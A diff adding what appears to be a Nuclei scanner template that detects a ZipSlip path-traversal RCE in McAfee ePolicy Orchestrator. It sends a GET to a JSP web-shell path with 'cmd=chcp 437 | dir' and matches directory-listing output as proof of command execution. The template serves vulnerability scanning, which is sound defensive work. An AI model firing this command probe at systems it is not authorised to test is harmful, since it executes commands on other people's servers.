@@ -1,0 +1,29 @@
+id: mcafee-epo-rce
+info:
+  author: dwisiswant0
+  description: "A ZipSlip vulnerability in McAfee ePolicy Orchestrator (ePO)\nis a\
+    \ type of Path Traversal occurring when archives are unpacked\nif the names of\
+    \ the packed files are not properly sanitized.\nAn attacker can create archives\
+    \ with files containing \u201C../\u201D in their names,\nmaking it possible to\
+    \ upload arbitrary files\nto arbitrary directories or overwrite existing ones\
+    \ during archive extraction.\n\nReferences:\n- https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/\n"
+  name: McAfee ePolicy Orchestrator RCE
+  severity: high
+  tags: mcafee,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: header
+    type: word
+    words:
+    - text/html
+  - part: body
+    regex:
+    - Volume (in drive [A-Z]|Serial Number) is
+    type: regex
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/stat.jsp?cmd=chcp+437+%7c+dir'
